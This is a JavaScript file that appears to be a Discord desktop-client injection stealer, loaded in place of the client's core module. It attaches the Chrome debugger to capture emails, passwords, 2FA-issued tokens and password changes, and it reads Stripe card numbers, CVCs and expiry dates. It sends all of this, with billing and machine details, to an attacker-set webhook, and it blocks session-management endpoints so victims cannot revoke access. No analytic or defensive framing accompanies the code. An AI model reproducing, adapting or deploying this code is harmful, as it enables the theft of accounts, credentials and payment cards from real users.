const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const { BrowserWindow, session } = require('electron');

const WEBHOOK = "%WEBHOOK%";

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = (method, url, headers, data) => {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const options = {
            protocol: parsedUrl.protocol,
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: method,
            headers: headers || {}
        };
// Ata Otcuoglu In The Club!
        const req = https.request(options, res => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve(body));
        });

        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
};

const sendWebhook = async (content) => {
    try {
        await request('POST', WEBHOOK, {
            'Content-Type': 'application/json'
        }, JSON.stringify(content));
    } catch (e) {}
};

const getInfo = async (token) => {
    try {
        const response = await request('GET', 'https://discord.com/api/v9/users/@me', {
            'Authorization': token
        });
        return JSON.parse(response);
    } catch {
        return null;
    }
};

const getBilling = async (token) => {
    try {
        const response = await request('GET', 'https://discord.com/api/v9/users/@me/billing/payment-sources', {
            'Authorization': token
        });
        const billing = JSON.parse(response);
        const methods = [];
        for (const method of billing) {
            if (!method.invalid) {
                if (method.type === 1) methods.push('Credit Card');
                if (method.type === 2) methods.push('PayPal');
            }
        }
        return methods.join(', ') || 'None';
    } catch {
        return 'None';
    }
};

const EmailPassToken = async (email, password, token, action) => {
    const info = await getInfo(token);
    if (!info) return;

    const billing = await getBilling(token);
    const nitro = info.premium_type === 1 ? 'Nitro Classic' : info.premium_type === 2 ? 'Nitro' : 'None';

    await sendWebhook({
        content: `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n**${info.username}** ${action}`,
        embeds: [{
            title: 'Account Information',
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Email', value: `\`${email}\``, inline: true },
                { name: 'Password', value: `\`${password}\``, inline: true },
                { name: 'Nitro', value: nitro, inline: true },
                { name: 'Billing', value: billing, inline: true }
            ],
            color: 0x2f3136
        }]
    });
};

const PasswordChanged = async (oldPass, newPass, token) => {
    const info = await getInfo(token);
    if (!info) return;

    await sendWebhook({
        content: `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n**${info.username}** changed password`,
        embeds: [{
            fields: [
                { name: 'Old Password', value: `\`${oldPass}\``, inline: true },
                { name: 'New Password', value: `\`${newPass}\``, inline: true }
            ],
            color: 0x2f3136
        }]
    });
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const info = await getInfo(token);
    if (!info) return;

    await sendWebhook({
        content: `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n**${info.username}** added credit card`,
        embeds: [{
            fields: [
                { name: 'Number', value: `\`${number}\``, inline: true },
                { name: 'CVC', value: `\`${cvc}\``, inline: true },
                { name: 'Expiration', value: `\`${month}/${year}\``, inline: true }
            ],
            color: 0x2f3136
        }]
    });
};

let email = '';
let password = '';

const createWindow = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (method !== 'Network.responseReceived') return;
        
        const url = params.response.url;
        if (![200, 202].includes(params.response.status)) return;

        try {
            const responseData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                requestId: params.requestId
            });
            const response = JSON.parse(responseData.body);

            const requestData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                requestId: params.requestId
            });
            const request = JSON.parse(requestData.postData);

            if (url.endsWith('/login')) {
                if (!response.token) {
                    email = request.login;
                    password = request.password;
                    return;
                }
                await EmailPassToken(request.login, request.password, response.token, 'logged in');
            } else if (url.endsWith('/register')) {
                await EmailPassToken(request.email, request.password, response.token, 'registered');
            } else if (url.endsWith('/totp')) {
                await EmailPassToken(email, password, response.token, 'logged in with 2FA');
            } else if (url.endsWith('/@me')) {
                if (request.password && request.new_password) {
                    await PasswordChanged(request.password, request.new_password, response.token);
                } else if (request.email && request.password) {
                    await EmailPassToken(request.email, request.password, response.token, `changed email to ${request.email}`);
                }
            }
        } catch (e) {}
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
};

session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://api.braintreegateway.com/merchants/*/client_api/*/payment_methods/paypal_accounts',
        'https://api.stripe.com/v*/tokens'
    ]
}, async (details) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method !== 'POST') return;

    try {
        if (details.url.includes('stripe')) {
            const data = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            const token = await getToken();
            await CreditCardAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token);
        }
    } catch (e) {}
});

session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        'wss://remote-auth-gateway.discord.gg/*',
        'https://discord.com/api/v*/auth/sessions',
        'https://*.discord.com/api/v*/auth/sessions'
    ]
}, (details, callback) => {
    callback({ cancel: true });
});

setTimeout(createWindow, 1000);

module.exports = require('./core.asar');
